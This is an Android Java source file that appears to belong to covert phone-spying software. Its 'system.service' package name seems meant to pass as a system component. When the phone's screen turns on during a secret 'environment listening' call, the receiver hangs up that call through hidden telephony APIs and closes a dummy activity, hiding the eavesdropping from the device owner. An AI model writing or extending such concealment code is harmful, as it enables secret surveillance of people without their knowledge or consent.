package system.service.receiver;

import java.lang.reflect.Method;

import system.service.GlobalValues;

import com.android.internal.telephony.ITelephony;
import com.particle.inspector.common.util.DummyActivity;
import com.particle.inspector.common.util.PowerUtil;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.phone.PhoneUtils;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;

public class ScreenStateReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "ScreenStateReceiver";

	@Override
	public void onReceive(Context context, Intent intent) 
	{
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		
		// When user turns on screen, end up env listening call immediately
		if (intent.getAction().equals(Intent.ACTION_SCREEN_ON) && GlobalValues.IS_ENV_LISTENING) 
		{
			TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
			try {
				PhoneUtils.getITelephony(tm).endCall();
			} catch (Exception ex) {	
				
			}
			
			// Broadcast intent to let DummyActivity to exit
			Intent exitIntent = new Intent(DummyActivity.BROADCAST_ACTION_DUMMY_ACTIVITY_EXIT);
			//Bundle bundle = new Bundle();
			//bundle.putBoolean("exit", true);
			//intent.putExtras(bundle);
			context.sendBroadcast(exitIntent);
            
			// Sleep seconds
			SysUtils.threadSleep(1000, LOGTAG);
		}
				
	}
	
	
}
